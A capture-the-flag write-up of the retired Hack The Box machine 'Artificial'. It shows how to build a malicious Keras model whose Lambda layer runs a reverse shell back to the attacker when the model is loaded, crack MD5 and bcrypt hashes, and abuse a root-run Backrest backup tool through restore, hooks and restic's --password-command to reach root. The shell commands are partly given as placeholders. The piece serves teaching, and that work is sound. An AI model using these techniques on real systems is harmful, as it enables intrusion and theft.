---
layout: post
title: "The Model Was the Payload"
subtitle: "HTB Artificial, where a machine-learning file runs code the moment you load it, and a backup tool that runs as root finishes the job"
date: 2025-11-01 12:00:00 +0000
description: "A saved AI model is just code in a trenchcoat, and Artificial loads it without asking what is inside, then hands you root through a backup tool that never learned to say no."
image: /assets/og/the-model-was-the-payload.png
tags: [hackthebox, writeup]
---

Artificial is a box about trust in a file format. It runs an AI site that lets you upload a trained model and see what it predicts, which sounds harmless until you remember what a saved model actually is. It is not a spreadsheet of numbers. It is a container that can carry code, and the site loads it the way you would open any document, by handing the whole thing to a library and saying "run this for me." You build a model whose only job is to call back to your listener, you click the button that loads it, and a shell drops. From there it is a database of weak hashes, a pivot to a real user, and a backup tool quietly running as root that will restore, hook, or fetch anything you point it at. No memory corruption anywhere. Just software that opened a file it should have inspected first.

```
        A R T I F I C I A L
        ===================
        upload  →  [ a "model" ]  the site loads it to predict
                        |
                        v
        but a saved model can carry code, and load_model
        runs that code the moment the file is opened.
                        |
                        v
        shell as app.  crack a hash.  become gael.
        then a backup tool running as root says
        "sure, i'll restore /root for you."
                                            模
```

## 0x01 · the front desk

Two ports answer, which on an easy box usually means the web app is the whole story.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Port 80 bounces you to `artificial.htb`, so that name goes in `/etc/hosts` and you go back. The site is a small Flask app with a login, a register page, and a dashboard. The pitch is friendly. Make an account, upload a trained AI model as a `.h5` file, and the server will load it and show you its predictions. The 404 page gives away the Flask backend, and the upload form only wants one thing, a Keras model in HDF5 format. That single accepted file type is the entire attack surface, and it is more than enough.

## 0x02 · a file that opens you back

Here is the part worth slowing down for. When a data scientist trains a model in TensorFlow and calls `model.save()`, the result is not a passive list of numbers. A Keras model can contain a `Lambda` layer, which is just a slot where you stuff an arbitrary Python function, and that function gets baked into the saved file. When anyone later calls `load_model()` on that file, the framework rebuilds the model exactly as described, which means it pulls your function back out and stands it up, ready to run. The file does not just describe a calculation. It describes code, and loading it is the same as agreeing to run that code.

Think of it like a recipe card that is allowed to include the instruction "before you cook, go unlock the front door." A normal card lists flour and eggs. A poisoned card slips a chore into the steps, and a cook who just follows the card top to bottom never stops to ask whether that step belonged there. The site is that cook. It takes the model you uploaded and reads it aloud to TensorFlow, step by step, and one of the steps is yours.

There is a catch that trips people up, and it is a good catch. The malicious model has to be built in the same TensorFlow version the server runs, here `2.13.1`, or the file format quietly drifts and the load fails. So you stand up a matching environment (a clean virtualenv or a pinned container) and build the smallest model that does nothing but carry a payload in its `Lambda` layer.

```python
import tensorflow as tf

def iceberg(x):
    import os
    os.system("[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(iceberg))
m.compile()
m.save("iceberg.h5")
```

The function returns `x` untouched so the model still looks like a working layer, which keeps the load from erroring out. The real cargo is the `os.system` line. Register, log in, upload the `.h5` from the dashboard, and then click the button that views predictions. That click is what calls `load_model`. The recipe gets read, your step runs, and the server dials home.

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from artificial.htb 10.10.10.x
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

You land as `app`, the low-privilege account the web app runs under. Not root, not a person, just the service. But you are inside, and the app keeps its secrets close.

## 0x03 · the hash drawer

Flask apps that handle logins almost always keep a local database, and this one is exactly where you would guess. In the app directory sits a SQLite file at `instance/users.db`, and a SQLite file is just a flat file you can read.

```
$ sqlite3 ~/app/instance/users.db 'select username,password from user'
gael|c99175974b6e192936d97224638a34f8
mark|0f3d8c76530022670f1c6029eed09ccb
```

Those passwords are thirty-two hex characters each, the unmistakable shape of raw MD5. Picture MD5 as a paper shredder that always cuts the same word into the same pattern of confetti. It feels one-way, but because the pattern never changes, anyone who has already shredded the whole dictionary can match your confetti against their pile and read the original right off the shelf. That pile exists. It is every cracking wordlist and every lookup site on the internet. Feeding `gael`'s hash to a lookup returns `mattp005numbertwo` instantly, because the word was common and the hash carried no salt to slow anyone down.

`gael` is a real local user, so the password is worth trying at the front door.

```
$ ssh gael@artificial.htb
gael@artificial:~$ cat user.txt
████████████████████████████████
```

A proper SSH session instead of a fragile reverse shell, and the user flag. `gael` belongs to the `sysadm` group, which is the thread to pull next.

## 0x04 · the tool that runs as root

Look at what is listening only on the inside of the box.

```
gael@artificial:~$ ss -ltnp | grep 9898
LISTEN 0  4096  127.0.0.1:9898  0.0.0.0:*
```

Something is bound to `127.0.0.1:9898`, reachable from the box but not from the outside. It is Backrest, a web front end for the `restic` backup engine, installed under `/opt/backrest` and running as root. Because it only listens on localhost, you reach it by tunneling the port back to yourself over the SSH session you already have. Think of an SSH tunnel as a private straw punched through the wall. The service still believes it is talking to something local, but the other end of the straw is your browser.

```
$ ssh -L 9898:localhost:9898 gael@artificial.htb
# now http://localhost:9898 in your browser is the box's Backrest
```

It wants a login. Backups, like web apps, keep their secrets in a config, and old backups have a way of leaving copies lying around. The `sysadm` group can read a stale archive in `/var/backups`, so you crack it open in a scratch directory.

```
gael@artificial:~$ cp /var/backups/backrest_backup.tar.gz /tmp/
gael@artificial:~$ tar xf /tmp/backrest_backup.tar.gz -C /tmp/
gael@artificial:~$ cat /tmp/backrest/.config/backrest/config.json
...
"name": "backrest_root",
"passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
```

That value is base64, and underneath it is a bcrypt hash. Decode the outer layer first, then crack the inner one.

```
$ echo 'JDJh...' | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
$ hashcat -m 3200 hash.txt rockyou.txt
... :!@#$%^
```

Bcrypt is the slow shredder, deliberately built to take real time per guess so a dictionary cannot be precomputed the way MD5's can. But slow does not save a password this trivial. `!@#$%^` is just the top row of the keyboard with shift held down, and `rockyou` has held that string for years. Log in to the tunneled Backrest as `backrest_root` and you are now driving a root-owned process through a friendly web UI.

## 0x05 · three doors, all marked root

This is the part that makes Backrest dangerous on a shared box. The whole point of a backup tool is to touch every file regardless of who owns it, so it runs as root and treats that as a feature. Once you control its UI, that power is yours, and Artificial leaves three doors open at once.

The cleanest is to abuse the restore feature. Create a repository and a backup plan that targets `/root`, click Backup Now, then use the snapshot browser to restore and download the result as an archive. Inside is `/root/.ssh/id_rsa`, root's private key, which you then use to walk in the front door as root.

```
$ ssh -i root/.ssh/id_rsa root@artificial.htb
root@artificial:~# cat /root/root.txt
████████████████████████████████
```

The second door is the hook system. Backrest lets a plan run a command when a backup finishes, and that command runs as root. You drop a `[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]` into the hook, run the plan, and catch a root shell on your listener. The third door is subtler and my favorite. Restic takes a `--password-command` flag, meaning "run this command to fetch my repo password," and Backrest passes your arguments straight through. Feed it `check --password-command '[ reverse shell ]'` and restic dutifully executes your command as root while thinking it is just asking for a password. Three different features, one identity behind all of them, and that identity is root.

## 0x06 · the honest caveat

The flashy half of Artificial is the model, and the lesson there is older than machine learning. Deserialization is the act of rebuilding a live object from a saved file, and any format rich enough to store behavior is rich enough to store an attack. Python pickles do it, Java's `readObject` did it for a decade of headlines, and now a Keras `.h5` does it because a `Lambda` layer is a place to keep code. The framework was not hacked. It did exactly what it promised, which was to faithfully reconstruct whatever the file described. The mistake was upstream, in a site that accepted a file capable of carrying code from a stranger and then loaded it as if it were inert data. If the thing you are opening can describe behavior, opening it is running it, and "but it is just a model file" is the same sentence as "but it is just a document" that has cost people everything for thirty years.

The quieter half is Backrest, and it is the half I would actually lose sleep over. Nothing there was a bug. A backup tool genuinely does need to read every file and genuinely does need to run as root to do its job. The failure was letting a low-value group reach an old archive that held the login, and letting that login sit behind a six-character keyboard mash. A tool that runs as root is a loaded tool by design, and the only thing standing between that power and an attacker is how well you guard the key to it. Here the key was in a readable backup, and the lock was the weakest password on the box.

## 0x07 · outro

```
the file said it was a model. it was a command in a costume.
the site read it aloud, and the words gave orders.

a hash fell out of a drawer. a password fell out of a backup.
both were too small to slow anyone down.

then a tool built to touch everything touched root for you,
because nobody ever taught it to refuse.

inspect what you load. guard what runs as root. wear black.

                                                            EOF
```

---

*HTB: Artificial, retired 25 Oct 2025. An easy Linux box that is really a lecture on deserialization wearing a machine-learning costume, finished off by a backup tool that runs as root and never learned to say no. The model still runs in a lab and nowhere you don't own.*